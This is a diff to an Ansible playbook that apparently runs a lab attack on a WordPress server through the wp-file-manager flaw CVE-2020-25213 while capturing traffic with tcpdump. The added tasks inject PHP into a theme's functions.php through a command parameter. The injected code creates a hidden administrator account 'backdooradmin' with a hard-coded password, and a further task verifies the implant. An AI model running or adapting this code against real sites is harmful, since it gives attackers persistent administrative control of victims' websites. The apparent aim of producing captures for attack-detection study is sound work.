@@ -12,7 +12,7 @@
     pcap_dir: "/tmp/pcap_files"
     script_dir: "/tmp/wp-file-manager-CVE-2020-25213/access.php"
     access_url: "http://{{ target_ip }}/wordpress/wp-content/plugins/wp-file-manager/lib/files/access.php"
-    capture_duration: 10  # Duration in seconds for packet capture
+    capture_duration: 10  # Duration in seconds for packet capture after attack
     attack_script_path: "/tmp/wp-file-manager-CVE-2020-25213/wp-file-manager-exploit.sh"  # Path to attack script
 
   tasks:
@@ -38,9 +38,9 @@
         nohup tcpdump -i any -w {{ pcap_dir }}/attacker.pcap host {{ target_ip }} > /tmp/tcpdump_attacker.log 2>&1 &
       when: inventory_hostname == "attack_server"
 
-    - name: "Start packet capture on target machine"
+    - name: "Start HTTP packet capture on target machine"
       ansible.builtin.shell: >
-        nohup tcpdump -i any -w {{ pcap_dir }}/target.pcap host {{ attacker_ip }} > /tmp/tcpdump_target.log 2>&1 &
+        nohup tcpdump -i any -w {{ pcap_dir }}/target.pcap port 80 > /tmp/tcpdump_target.log 2>&1 &
       when: inventory_hostname == "web_server"
 
     - name: "Upload access script to web server"
@@ -70,6 +70,37 @@
         var: command_output.content
       when:
         - inventory_hostname == "attack_server"
+
+    - name: "Create backup backdoor via command execution"
+      uri:
+        url: "http://{{ target_ip }}/wordpress/?cmd={{ inject_backdoor_command | urlencode }}"
+        return_content: yes
+        method: GET
+      register: backdoor_injection
+      when: inventory_hostname == "attack_server"
+      vars:
+        inject_backdoor_command: |
+          echo '<?php
+          add_action("wp_head", "WordPress_backdoor");
+          function WordPress_backdoor() {
+              if ($_GET["backdoor"] == "go") {
+                  require("wp-includes/registration.php");
+                  if (!username_exists("backdooradmin")) {
+                      $user_id = wp_create_user("backdooradmin", "Pa55W0rd");
+                      $user = new WP_User($user_id);
+                      $user->set_role("administrator");
+                  }
+              }
+          }
+          ?>' >> /var/www/html/wordpress/wp-content/themes/twentytwentyone/functions.php
+
+    - name: "Verify backdoor installation"
+      uri:
+        url: "http://{{ target_ip }}/wordpress/?cmd=tail+-n+10+/var/www/html/wordpress/wp-content/themes/twentytwentyone/functions.php"
+        return_content: yes
+        method: GET
+      register: backdoor_verify
+      when: inventory_hostname == "attack_server"
 
     - name: "Wait for packet capture to complete"
       ansible.builtin.pause:
